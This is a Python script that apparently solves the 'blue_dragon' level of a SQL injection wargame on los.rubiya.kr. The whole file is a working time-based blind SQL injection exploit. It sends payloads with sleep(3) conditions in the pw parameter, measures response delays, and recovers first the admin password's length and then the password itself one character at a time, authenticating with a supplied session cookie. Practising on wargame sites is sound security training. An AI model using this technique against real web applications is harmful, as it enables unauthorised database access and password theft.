import urllib.request
import sys
import time

url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php?"
cookie = sys.argv[1]
pw = ''
letter = 'abcdefghijklmnopqrstuvwxyz1234567890'

for i in range(100):
  query = "id=admin&pw=%27or%20id=%27admin%27%26%26if(length(pw)={},sleep(3),0)%23".format(i)
  ut = time.time()
  req = urllib.request.Request(
    url+query,
    data=None,
    headers={
      "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
      "Cookie" : cookie
    })
  with urllib.request.urlopen(req) as res:
    body = res.read().decode()
  if time.time() - ut > 3:
    pw_len = i
    break
print(pw_len)

for i in range(1, pw_len+1):
  for j in letter:
    query = "id=admin&pw=%27or%20id=%27admin%27%26%26if(substr(pw,{},1)=%27{}%27,sleep(3),0)%23".format(i,j)
    ut = time.time()
    req = urllib.request.Request(
      url+query,
      data=None,
      headers={
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Cookie" : cookie
      })
    with urllib.request.urlopen(req) as res:
      body = res.read().decode()
    if time.time() - ut > 3:
      pw += j
      break
print(pw)
